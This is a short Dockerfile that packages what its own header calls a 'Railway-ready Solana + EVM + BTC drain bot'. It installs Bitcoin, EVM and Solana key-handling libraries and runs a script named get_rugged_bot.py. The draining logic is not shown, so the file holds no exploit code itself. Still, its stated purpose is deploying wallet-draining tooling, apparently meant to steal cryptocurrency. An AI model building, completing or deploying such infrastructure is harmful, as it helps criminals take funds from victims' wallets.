# Railway-ready Solana + EVM + BTC drain bot
FROM python:3.12-slim-bookworm

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc g++ libffi-dev libssl-dev \
    && rm -rf /var/lib/apt/lists/*

COPY requirements.txt .
RUN pip install --upgrade pip setuptools wheel \
    && pip install -r requirements.txt \
    && python -c "from bit import Key; print('bit OK')" \
    && python -c "from web3 import Web3; print('web3 OK')" \
    && python -c "from solders.keypair import Keypair; print('solders OK')"

COPY get_rugged_bot.py .

CMD ["python", "get_rugged_bot.py"]
